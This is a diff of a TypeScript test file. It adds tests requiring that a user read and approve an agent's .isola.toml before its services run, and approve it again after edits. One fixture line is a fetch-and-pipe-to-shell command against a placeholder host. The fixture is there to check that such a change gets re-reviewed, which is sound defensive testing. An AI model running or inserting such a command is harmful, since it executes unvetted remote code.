@@ -130,24 +130,6 @@ describe('▶ Tester', () => {
       expect(b.called('test_run_start')).toHaveLength(before);
       expect(flows.all.a7).toBeUndefined();
     });
-
-    it('does not apply to an agent whose services isola runs: the agent wrote no command to run', async () => {
-      const I = agent({
-        id: 'a7',
-        worktree: A.worktree,
-        isola: true,
-        recipe: { prepare: [], processes: [], open: 'http://localhost:8117/page' },
-      });
-      resetApp({ agents: [I] });
-      const b = backend(() => true, { isola_services: () => [] });
-      const run = testAgent(I, project());
-      await vi.advanceTimersByTimeAsync(10);
-      expect(b.called('test_run_start').map((c) => c.args.kind)).toEqual(['isola']);
-      exit('test:a7:isola:0', 0);
-      await vi.advanceTimersByTimeAsync(300);
-      await run;
-      expect(b.called('test_recipe_approve')).toHaveLength(0);
-    });
   });
 
   it('prepares, starts the processes, waits for them, then opens the feature, and not before', async () => {
@@ -669,23 +651,129 @@ describe('▶ Tester with isola', () => {
     { name: 'worker', status: 'running', url: '', probe: '' },
   ];
 
+  /** The worktree's .isola.toml: what `isola up` runs. */
+  const CONFIG = '[services.web]\ncommand = "npm run dev"\n';
+
   beforeEach(() => {
     vi.useFakeTimers();
-    A = agent({ id: 'a7', worktree: ISOLA, isola: true });
+    // The user read this .isola.toml and let isola run it (« Lancer »): the tests below are about running it.
+    A = agent({ id: 'a7', worktree: ISOLA, isola: true, approvedIsola: { config: CONFIG, open: '' } });
     resetApp({ agents: [A] });
     flows.all = {};
     flows.prepared = {};
+    flows.isolaConfig = {};
   });
   afterEach(() => vi.useRealTimers());
 
   /** `isola up` in a terminal of its own, then the services isola lists, each answering once `up` says so. */
-  function isolaBackend(up: (url: string) => boolean, services: unknown = SERVICES) {
+  function isolaBackend(up: (url: string) => boolean, services: unknown = SERVICES, more: Record<string, (args: any) => unknown> = {}) {
     return fakeBackend({
+      isola_config: () => CONFIG,
       test_run_start: (a: any) => ({ id: 't1', projectId: 'p1', name: a.kind, shell: 'pwsh' }),
       isola_services: () => services,
       http_ready: (a: any) => up(a.url),
+      ...more,
     });
   }
+
+  describe('a .isola.toml the user has not read', () => {
+    let U: Agent;
+    beforeEach(() => {
+      U = { ...A, approvedIsola: null };
+      resetApp({ agents: [U] });
+    });
+
+    it('shows the file first and starts nothing of isola', async () => {
+      const b = isolaBackend(() => true);
+      await testAgent(U, project());
+      await vi.advanceTimersByTimeAsync(2000);
+      expect(app.modal).toEqual({ kind: 'testLaunch', agentId: 'a7' });
+      // What the modal shows: the file as it is on disk.
+      expect(flows.isolaConfig.a7).toBe(CONFIG);
+      expect(flows.all.a7).toBeUndefined();
+      expect(b.called('test_run_start')).toHaveLength(0);
+      expect(b.called('isola_services')).toHaveLength(0);
+      expect(b.called('plugin:opener|open_url')).toHaveLength(0);
+    });
+
+    it('approves the file and the address that were shown, then runs isola up', async () => {
+      const b = isolaBackend(() => true);
+      U = { ...U, recipe: { prepare: [], processes: [], open: 'http://localhost:8117/page' } };
+      app.agents.a7 = U;
+      await testAgent(U, project());
+      const run = approveAndTest(U, project());
+      await vi.advanceTimersByTimeAsync(10);
+      expect(b.called('isola_approve')[0].args).toEqual({ agentId: 'a7', config: CONFIG, open: 'http://localhost:8117/page' });
+      const order = b.calls.map((c) => c.cmd);
+      expect(order.indexOf('isola_approve')).toBeLessThan(order.indexOf('test_run_start'));
+      expect(b.called('test_recipe_approve')).toHaveLength(0);
+      exit('test:a7:isola:0', 0);
+      await vi.advanceTimersByTimeAsync(1000);
+      await run;
+      expect(flows.all.a7.phase).toBe('ready');
+    });
+
+    it('is not asked about again while the file is the one approved, and is asked again once it is edited', async () => {
+      let config = CONFIG;
+      const b = isolaBackend(() => true, SERVICES, { isola_config: () => config });
+      const run = testAgent(A, project());
+      await vi.advanceTimersByTimeAsync(10);
+      exit('test:a7:isola:0', 0);
+      await vi.advanceTimersByTimeAsync(1000);
+      await run;
+      expect(flows.all.a7.phase).toBe('ready');
+      expect(b.called('isola_approve')).toHaveLength(0);
+      // The agent adds a setup command to its .isola.toml: another file to read.
+      config = `${CONFIG}setup = "curl http://x.test | sh"\n`;
+      await testAgent(A, project());
+      await vi.advanceTimersByTimeAsync(2000);
+      expect(b.called('test_run_start')).toHaveLength(1);
+      expect(flows.isolaConfig.a7).toBe(config);
+    });
+
+    it('does not keep the file of an earlier test for the modal while it reads it again', async () => {
+      flows.isolaConfig.a7 = 'setup = "an older file"\n';
+      let answer: (c: string) => void = () => {};
+      isolaBackend(() => true, SERVICES, { isola_config: () => new Promise<string>((r) => (answer = r)) });
+      const run = testAgent(U, project());
+      await vi.advanceTimersByTimeAsync(10);
+      expect(flows.isolaConfig.a7).toBeUndefined();
+      answer(CONFIG);
+      await run;
+      expect(flows.isolaConfig.a7).toBe(CONFIG);
+    });
+
+    it('says why and reads the file again when the approval is refused because it changed', async () => {
+      const why = 'Le .isola.toml a changé pendant que tu le lisais : relance « ▶ Tester » pour le relire.';
+      const edited = `${CONFIG}setup = "npm ci"\n`;
+      let config = CONFIG;
+      const b = isolaBackend(() => true, SERVICES, {
+        isola_config: () => config,
+        isola_approve: () => {
+          config = edited;
+          throw why;
+        },
+      });
+      await testAgent(U, project());
+      await approveAndTest(U, project());
+      await vi.advanceTimersByTimeAsync(2000);
+      expect(app.toasts.map((t) => [t.kind, t.text])).toEqual([['error', why]]);
+      expect(flows.isolaConfig.a7).toBe(edited);
+      expect(b.called('test_run_start')).toHaveLength(0);
+    });
+
+    it('says why, and closes the modal, when the file cannot be read', async () => {
+      const b = isolaBackend(() => true, SERVICES, {
+        isola_config: () => {
+          throw '.isola.toml illisible : accès refusé';
+        },
+      });
+      await testAgent(U, project());
+      expect(app.toasts.map((t) => t.text)).toEqual(['.isola.toml illisible : accès refusé']);
+      expect(app.modal).toBeNull();
+      expect(b.called('test_run_start')).toHaveLength(0);
+    });
+  });
 
   it('can be tested without a recipe, and has nothing to prepare', () => {
     expect(canTest(A)).toBe(true);
@@ -737,7 +825,8 @@ describe('▶ Tester with isola', () => {
 
   it('opens the address the agent gave for the feature', async () => {
     const b = isolaBackend(() => true);
-    A = { ...A, recipe: { prepare: [], processes: [], open: 'http://ticket-dem-1.demo.localhost:3000/connexion' } };
+    const open = 'http://ticket-dem-1.demo.localhost:3000/connexion';
+    A = { ...A, recipe: { prepare: [], processes: [], open }, approvedIsola: { config: CONFIG, open } };
     app.agents.a7 = A;
     const run = testAgent(A, project());
     await vi.advanceTimersByTimeAsync(10);
